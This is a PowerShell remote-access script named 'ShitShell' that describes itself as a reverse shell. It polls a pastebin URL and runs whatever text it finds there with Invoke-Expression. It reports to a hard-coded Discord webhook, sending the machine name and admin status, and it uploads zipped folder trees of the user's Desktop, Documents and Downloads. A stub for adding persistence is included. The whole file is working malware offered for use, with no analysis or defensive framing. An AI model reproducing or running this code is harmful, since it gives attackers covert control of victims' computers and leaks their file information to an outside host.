
$bin = "https://pastebin.com/raw/q3byS8Km"
$hookurl = "https://discord.com/api/webhooks/1186256849985605692/HOuOJ-xe6NBS6erGC7F7OFGnCrsV_BVK-i5B7ca8QiT0vACpxIqpOUe09HtdMcdinNI0"

#Welcome message
$timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
$jsonPayload = @{
    tts        = $false
    embeds     = @(
        @{
            title       = "$env:COMPUTERNAME | ShitShell session started!"
            description = "``The worst Reverse Shell out there!" +
                          "`nYou can youse the following commands:``" +
                          "`n`n:arrow_forward: Close: Closes the current ShitShell session." +
                          "`n:arrow_forward: FolderTree: Gets folder trees and sends it to your Webhook." +
                          "`n:arrow_forward: CheckForAdmin: Checks if the script is being run as admin."
            color       = 16711680
            author      = @{
                name     = "ShitShell"
            }
            footer      = @{
                text = "$timestamp"
            }
        }
    )
}
$jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
Invoke-RestMethod -Uri $hookUrl -Method Post -Body $jsonString -ContentType 'application/json'

Function FolderTree{
tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
$FilePath ="$env:temp/TreesOfKnowledge.zip"
Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt -DestinationPath $FilePath
sleep 1
curl.exe -F file1=@"$FilePath" $hookurl | Out-Null
rm -Path $FilePath -Force
Write-Output "Done."
}

function Close {

    $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
    $jsonPayload = @{
        tts        = $false
        embeds     = @(
            @{
                title       = "$env:COMPUTERNAME | ShitShell session closed!"
                description = ":octagonal_sign:  The ShitShell session was closed! :octagonal_sign:"
                color       = 16711680
                author      = @{
                    name     = "ShitShell"
                }
                footer      = @{
                    text = "$timestamp"
                }
            }
        )
    }
    $jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body $jsonString -ContentType 'application/json'

    break
}


function CheckForAdmin {

    If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')){
        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":x: ``Not an Admin!`` :x:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
    }else{
        $body = @{"username" = "$env:COMPUTERNAME"; "content" = ":white_check_mark:  ``Its an Admin!`` :white_check_mark:"} | ConvertTo-Json
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $body
    }
    
}


function AddPersistance {

    
}




##########################
$commands = @()

while ($true) {
    
    $PastBinText = (Invoke-WebRequest $bin).Content

    if($commands -contains $PastBinText -or $commands -ccontains $PastBinText ){

        Start-Sleep 10

    }
    else {
        Invoke-Expression $PastBinText
        

        $commands += $PastBinText
    }


}

